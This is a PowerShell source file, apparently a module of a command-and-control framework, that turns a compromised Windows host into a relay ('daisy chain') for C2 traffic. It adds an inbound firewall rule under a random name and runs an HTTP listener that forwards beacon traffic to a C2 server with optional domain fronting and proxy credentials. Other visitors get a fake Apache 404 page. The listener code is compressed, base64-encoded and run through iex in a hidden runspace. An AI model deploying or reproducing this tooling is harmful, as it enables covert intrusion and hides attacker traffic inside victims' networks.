<#
.Synopsis
    Invoke-DaisyChain

    Ben Turner @benpturner

.DESCRIPTION
	PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://10.150.10.20 -port 8888 -c2port 8888 -c2server http://10.150.10.10 -URLs '"pwned/test/123","12345/drive/home.php"'
#>
$firewallName = ""
$serverPort = ""
function Invoke-DaisyChain {

param(
[Parameter(Mandatory=$true)][string]$port, 
[Parameter(Mandatory=$true)][string]$daisyserver,
[Parameter(Mandatory=$true)][string]$c2server, 
[Parameter(Mandatory=$true)][string]$c2port,
[Parameter(Mandatory=$true)][string]$URLs,
[Parameter(Mandatory=$false)][switch]$Localhost,
[Parameter(Mandatory=$false)][switch]$NoFWRule,
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword
)
$fw = Get-FirewallName -Length 15
$script:firewallName = $fw
$firewallName = $fw 

if ($Localhost.IsPresent){
echo "[+] Using localhost parameter"
$HTTPServer = "localhost"
$daisyserver = "http://localhost"
$NoFWRule = $true
} else {
$HTTPServer = "+"
}

$script:serverPort = $port
if ($NoFWRule.IsPresent) {
    $fwcmd = "echo `"No firewall rule added`""
}else {
    echo "Adding firewall rule name: $firewallName for TCP port $port"
    echo "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
}

$fdsf = @"
`$username = "$proxyuser"
`$password = "$proxypassword"
`$proxyurl = "$proxyurl"
`$domainfrontheader = "$domfront"
`$serverport = '$port'
`$Server = "${c2server}:${c2port}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
function Get-Webclient (`$Cookie) {
`$username = `$username
`$password = `$password
`$proxyurl = `$proxyurl
`$wc = New-Object System.Net.WebClient;  
`$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko")
`$wc.Headers.Add("Referrer","")
`$h=`$domainfrontheader
if (`$h) {`$wc.Headers.Add("Host",`$h)}
if (`$proxyurl) {
`$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
`$wc.Proxy = `$wp;
}
if (`$username -and `$password) {
`$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
`$getcreds = new-object system.management.automation.PSCredential `$username,`$PSS; 
`$wp.Credentials = `$getcreds;
} else {
`$wc.UseDefaultCredentials = `$true; 
}
if (`$cookie) {
`$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
}
`$wc
}
`$httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL/s was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
'
`$URLS = $($URLS)
`$listener = New-Object -TypeName System.Net.HttpListener 
`$listener.Prefixes.Add("http://$($HTTPServer):`$serverport/") 
`$listener.Start()
echo "started http server"
while (`$listener.IsListening) 
{
    if (`$kill.log -eq 2) {`$listener.Stop();exit}
    `$message = `$null
    `$context = `$listener.GetContext() # blocks until request is received
    `$request = `$context.Request
    `$response = `$context.Response       
    `$url = `$request.RawUrl
    `$newurl = `$url -replace "\?", ""
    `$method = `$request.HttpMethod
    if (`$null -ne (`$URLS | ? { `$newurl -match `$_ }) ) {
        `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
        `$responseStream = `$request.InputStream 
        `$targetStream = New-Object -TypeName System.IO.MemoryStream 
        `$buffer = new-object byte[] 10KB 
        `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
        `$downloadedBytes = `$count 
        while (`$count -gt 0) 
        { 
            `$targetStream.Write(`$buffer, 0, `$count) 
            `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
            `$downloadedBytes = `$downloadedBytes + `$count 
        } 
        `$len = `$targetStream.length
        `$size = `$len + 1
        `$size2 = `$len -1
        `$buffer = New-Object byte[] `$size
        `$targetStream.Position = 0
        `$targetStream.Read(`$buffer, 0, `$targetStream.Length)|Out-null
        `$buffer = `$buffer[0..`$size2]
        `$targetStream.Flush()
        `$targetStream.Close() 
        `$targetStream.Dispose()
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
        if (`$method -eq "GET") {
        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString("`$(`$Server)`$(`$url)")
        }
        if (`$method -eq "POST") {
        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$(`$Server)`$(`$url)", `$buffer)
        }
    }
    if (!`$message) {
        `$message = `$httpresponse
        echo `$request
    }
    [byte[]] `$buffer = [System.Text.Encoding]::UTF8.GetBytes(`$message)
    `$response.ContentLength64 = `$buffer.length
    `$response.StatusCode = 200
    `$response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    `$response.Headers.Add("Pragma", "no-cache")
    `$response.Headers.Add("Expires", 0)
    `$output = `$response.OutputStream
    `$output.Write(`$buffer, 0, `$buffer.length)
    `$output.Close()
    `$message = `$null
}
`$listener.Stop()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

$t = Invoke-Netstat| ? {$_.ListeningPort -eq $port}
$global:kill = [HashTable]::Synchronized(@{})
$kill.log = "1"

$fwcmd|iex

if (!$t) { 
    if (Test-Administrator) { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null
        echo ""
        echo "[+] Running DaisyServer as Administrator:"
    } else { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null 
        echo ""
        echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work:"
    }  

    echo "[+] To stop the Daisy Server, Stop-Daisy current process"
}

}
function Stop-Daisy {
$kill.log = 2
Netsh.exe advfirewall firewall del rule name="$firewallName"
(new-object system.net.webclient).downloadstring("http://localhost:$serverPort")
}
function Get-FirewallName 
{
param (
    [int]$Length
)
$set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
$result = ''
for ($x = 0; $x -lt $Length; $x++) 
{
    $result += $set | Get-Random
}
return $result
}
Function Invoke-Netstat {                       
try {            
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpListeners()            
    foreach($Connection in $Connections) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
        $OutputObj            
    }            
            
} catch {            
    Write-Error "Failed to get listening connections. $_"            
}
}
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

